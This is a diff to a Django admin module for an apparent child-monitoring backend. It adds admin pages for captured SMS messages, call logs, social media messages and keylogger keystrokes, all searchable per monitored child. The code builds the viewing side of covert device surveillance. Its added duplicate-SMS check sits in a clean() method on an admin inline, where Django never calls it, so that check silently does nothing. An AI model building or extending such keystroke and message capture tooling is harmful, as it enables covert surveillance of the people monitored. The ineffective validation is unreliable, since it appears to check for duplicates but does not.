@@ -1,7 +1,10 @@
 from django.contrib import admin
 from django.utils.html import format_html
-from .models import (Child, LocationLog, IPLog, DeviceInfoLog, PhotoCapture,
-                     SensorDataLog, PermissionLog)
+from .models import (
+    Child, LocationLog, IPLog, DeviceInfoLog, PhotoCapture,
+    SensorDataLog, PermissionLog, SMSLog, CallLog, SocialMediaLog, KeyloggerLog,
+    SocialMediaMessage, AppUsage, ScreenTime, GeofenceAlert
+)
 
 class LocationLogInline(admin.TabularInline):
     model = LocationLog
@@ -39,18 +42,56 @@ class PermissionLogInline(admin.TabularInline):
     readonly_fields = ('timestamp', 'geolocation', 'camera', 'microphone', 'notifications', 'clipboard', 'sensors', 'bluetooth', 'other')
     ordering = ('-timestamp',)
 
+class SMSLogInline(admin.TabularInline):
+    model = SMSLog
+    extra = 0
+    readonly_fields = ('timestamp', 'message', 'sender', 'receiver', 'direction')
+    ordering = ('-timestamp',)
+
+    def clean(self):
+        super().clean()
+        if hasattr(self, 'cleaned_data') and self.cleaned_data:
+            child = self.instance.child
+            message = self.cleaned_data.get('message')
+            timestamp = self.cleaned_data.get('timestamp')
+            
+            if message and timestamp:
+                if SMSLog.objects.filter(
+                    child=child,
+                    message=message,
+                    timestamp=timestamp
+                ).exists():
+                    from django.core.exceptions import ValidationError
+                    raise ValidationError('Duplicate SMS log entry detected')
+
+# Removed duplicate CallLog registration
+class CallLogInline(admin.TabularInline):
+    model = CallLog
+    extra = 0
+    readonly_fields = ('timestamp', 'caller', 'callee', 'duration')
+    ordering = ('-timestamp',)
+
+class SocialMediaLogInline(admin.TabularInline):
+    model = SocialMediaLog
+    extra = 0
+    readonly_fields = ('timestamp', 'platform', 'sender', 'message')
+    ordering = ('-timestamp',)
+
+class KeyloggerLogInline(admin.TabularInline):
+    model = KeyloggerLog
+    extra = 0
+    readonly_fields = ('timestamp', 'keystrokes')
+    ordering = ('-timestamp',)
+
 @admin.register(Child)
 class ChildAdmin(admin.ModelAdmin):
     list_display = ('name', 'device_id', 'parent', 'update_interval', 'latest_location_map_link_display')
     search_fields = ('name', 'device_id', 'parent__username')
     list_filter = ('parent',)
     inlines = [
-        LocationLogInline,
-        IPLogInline,
-        DeviceInfoLogInline,
-        PhotoCaptureInline,
-        SensorDataLogInline,
-        PermissionLogInline
+        LocationLogInline, IPLogInline, DeviceInfoLogInline, PhotoCaptureInline,
+        SensorDataLogInline, PermissionLogInline, SMSLogInline, CallLogInline,
+        SocialMediaLogInline, KeyloggerLogInline
     ]
 
     def latest_location_map_link_display(self, obj):
@@ -107,3 +148,31 @@ class PermissionLogAdmin(admin.ModelAdmin):
     list_filter = ('child', 'timestamp')
     date_hierarchy = 'timestamp'
     search_fields = ('child__name',)
+
+@admin.register(SMSLog)
+class SMSLogAdmin(admin.ModelAdmin):
+    list_display = ('child', 'timestamp', 'direction', 'sender', 'receiver', 'message')
+    list_filter = ('child', 'timestamp', 'direction')
+    date_hierarchy = 'timestamp'
+    search_fields = ('child__name', 'sender', 'receiver', 'message')
+
+@admin.register(CallLog)
+class CallLogAdmin(admin.ModelAdmin):
+    list_display = ('child', 'timestamp', 'caller', 'callee', 'duration')
+    list_filter = ('child', 'timestamp')
+    date_hierarchy = 'timestamp'
+    search_fields = ('child__name', 'caller', 'callee')
+
+@admin.register(SocialMediaLog)
+class SocialMediaLogAdmin(admin.ModelAdmin):
+    list_display = ('child', 'timestamp', 'platform', 'sender', 'message')
+    list_filter = ('child', 'timestamp', 'platform')
+    date_hierarchy = 'timestamp'
+    search_fields = ('child__name', 'platform', 'sender', 'message')
+
+@admin.register(KeyloggerLog)
+class KeyloggerLogAdmin(admin.ModelAdmin):
+    list_display = ('child', 'timestamp', 'keystrokes')
+    list_filter = ('child', 'timestamp')
+    date_hierarchy = 'timestamp'
+    search_fields = ('child__name', 'keystrokes')
